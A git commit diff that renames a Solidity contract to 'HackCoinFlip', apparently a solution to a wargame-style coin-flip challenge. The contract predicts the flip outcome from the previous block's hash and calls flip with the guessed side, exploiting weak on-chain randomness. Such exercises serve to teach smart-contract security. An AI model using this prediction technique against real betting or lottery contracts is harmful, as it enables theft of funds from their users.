b980a4df87f0a07df7de1232585d69ae3f680a57
John Matthews <JMMatthews@Protonmail.com>
2022-01-20 22:29:36 -0600

    Change name of contract

--- contracts/HackCoinFlip.sol
+++ contracts/HackCoinFlip.sol
@@ -3,13 +3,13 @@ pragma solidity ^0.6.0;
 
 import "./CoinFlip.sol";
 
-contract Hack is CoinFlip {
+contract HackCoinFlip is CoinFlip {
     bool public side;
 
     function hack() public {
         uint256 blockValue = uint256(blockhash(block.number.sub(1)));
         uint256 coinFlip = blockValue.div(FACTOR);
         side = coinFlip == 1 ? true : false;
-        CoinFlip.flip(side);
+        flip(side);
     }
 }
